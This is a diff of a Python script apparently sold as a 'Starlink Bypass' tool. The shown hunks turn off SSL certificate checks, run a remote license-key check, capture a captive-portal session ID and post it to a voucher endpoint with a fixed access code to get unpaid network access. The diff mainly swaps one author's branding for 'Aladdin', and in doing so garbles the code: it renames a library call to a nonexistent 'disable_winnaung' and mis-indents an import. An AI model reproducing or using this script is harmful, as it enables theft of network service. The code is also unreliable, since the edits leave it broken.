@@ -1,10 +1,10 @@
-import requests, re, urllib3, time, threading, os, random, hashlib, platform, ssl, json
+    import requests, re, urllib3, time, threading, os, random, hashlib, platform, ssl, json
 import subprocess
 from urllib.parse import urlparse, parse_qs, urljoin
 from datetime import datetime
 
 
-# --- SSL Error & Warnings Bypass ---
+# --- SSL Error & Winnaung Bypass ---
 try:
     _create_unverified_https_context = ssl._create_unverified_context
 except AttributeError:
@@ -12,11 +12,11 @@ except AttributeError:
 else:
     ssl._create_default_https_context = _create_unverified_https_context
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+urllib3.disable_winnaung(urllib3.exceptions.InsecureRequestWarning)
 
 # --- CONFIGURATION ---
-KEY_URL = "https://raw.githubusercontent.com/winnaung000001-bit/winnaung/refs/heads/main/key.txt"
-LICENSE_FILE = ".winnaung_v11.lic" # ဖုန်းထဲမှာ သိမ်းမယ့် Hidden License File
+KEY_URL = "https://raw.githubusercontent.com/winnaungmyat3-bit/winnaung/refs/heads/main/key.txt"
+LICENSE_FILE = ".aladdin_v11.lic" # ဖုန်းထဲမှာ သိမ်းမယ့် Hidden License File
 def get_hwid():
     ID_STORAGE = ".device_id" # ID သိမ်းမည့်ဖိုင်
     
@@ -56,12 +56,12 @@ def banner():
     os.system('clear')
     print("\033[93m" + " ="*35)
     print("\033[96m" + """
-██╗    ██╗██╗███╗   ██╗███╗   ██╗ █████╗ ██╗   ██╗███╗   ██╗ ██████╗ 
+     ██╗    ██╗██╗███╗   ██╗███╗   ██╗ █████╗ ██╗   ██╗███╗   ██╗ ██████╗ 
 ██║    ██║██║████╗  ██║████╗  ██║██╔══██╗██║   ██║████╗  ██║██╔════╝ 
 ██║ █╗ ██║██║██╔██╗ ██║██╔██╗ ██║███████║██║   ██║██╔██╗ ██║██║  ███╗
 ██║███╗██║██║██║╚██╗██║██║╚██╗██║██╔══██║██║   ██║██║╚██╗██║██║   ██║
 ╚███╔███╔╝██║██║ ╚████║██║ ╚████║██║  ██║╚██████╔╝██║ ╚████║╚██████╔╝
- ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝
+ ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝  
     """)
     print("\033[95m" + "        ✨ winnaung Starlink Bypass - IMMORTAL V11 ✨")
     print("\033[93m" + " ="*35 + "\033[0m\n")
@@ -172,7 +172,7 @@ def start_immortal():
             sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
             
             if sid:
-                print(f"\033[96m[✓] winnaung SID Captured: {sid[:15]}\033[0m")
+                print(f"\033[96m[✓] Aladdin SID Captured: {sid[:15]}\033[0m")
                 p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
                 session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                 
